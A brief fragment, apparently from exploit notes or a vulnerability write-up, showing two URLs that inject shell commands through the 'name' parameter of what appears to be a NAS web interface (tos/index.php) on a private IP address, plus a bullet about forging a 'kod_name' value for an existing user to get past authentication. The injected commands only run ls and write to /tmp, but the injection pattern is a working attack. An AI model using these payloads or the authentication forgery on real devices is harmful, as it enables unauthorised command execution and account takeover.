...
```
http://192.168.2.201:8181/tos/index.php?app/del&id=0&name=;ls%3E/tmp/xyz.txt;ls%23

http://192.168.2.201:8181/tos/index.php?app/hand_app&name=;ls%3E/tmp/kjl.txt;ls.tpk
```
...
- craft a `kod_name` with an existing user (quiet easy)
